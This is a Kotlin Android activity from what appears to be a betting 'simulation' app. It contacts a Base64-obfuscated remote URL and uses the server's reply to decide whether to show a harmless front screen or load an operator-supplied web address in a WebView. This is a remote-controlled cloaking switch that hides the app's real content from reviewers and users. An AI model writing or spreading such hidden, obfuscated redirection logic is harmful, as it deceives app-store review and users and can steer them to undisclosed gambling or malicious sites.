package com.BELAIBET.simulation

import android.animation.ObjectAnimator
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.BELAIBET.simulation.front.FrontActivity
import com.BELAIBET.simulation.web.WebActivity
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.android.material.progressindicator.LinearProgressIndicator
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking


class OperateActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.loading_activity)
        val sPref = applicationContext.getSharedPreferences("MyPref", 0)
        val editor = sPref.edit()



        val loadLine: LinearProgressIndicator = findViewById(R.id.loading_line)
        val animator = ObjectAnimator.ofInt(loadLine, "progress", loadLine.progress, 100)
        animator.duration = 2000
        animator.start()



//                if(false)
        Handler(Looper.getMainLooper()).postDelayed({
            runBlocking {
            try {
                getMyIp(object : ApiResponse {
                    override fun onSuccess(response: String) {
                        lifecycleScope.launch(Dispatchers.Main) {
                            Log.e("textFromSite", response)
                            if (response == "<html><style>body{margin:0}</style><body></body></html>" || response.isEmpty())
                                startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                            else if (response == "") {
                                startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                            } else {
                                editor.putString("url", response)
                                editor.commit()
                                Log.d("afterPut", response)
                                startActivity(Intent(this@OperateActivity, WebActivity::class.java))
                            }
                            Log.d("textFromSite", response)
                        }
                    }

                    override fun onError() {
                        lifecycleScope.launch(Dispatchers.Main) {
                            startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                        }
                        Log.d("textFromSite", "Error")
                    }

                })
            } catch (e: Exception) {
                Toast.makeText(
                    this@OperateActivity.applicationContext,
                    e.toString(),
                    Toast.LENGTH_SHORT
                ).show();
            }

        } }, 2000)

//        startActivity(Intent(this@OperateActivity, WebActivity::class.java))
    }
    interface ApiResponse {
        fun onSuccess(response: String)
        fun onError()
    }

    fun getMyIp(apiResponse: ApiResponse) {
        val queue = Volley.newRequestQueue(this)
        val url = Base64.decode("aHR0cHM6Ly9iYWxlaWEuY2ZkL3pIcWJ5aFJT", Base64.DEFAULT).toString(Charsets.UTF_8)

        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                apiResponse.onSuccess(response)
            },
            {
                apiResponse.onError()
            }
        )

        queue.add(stringRequest)
    }

}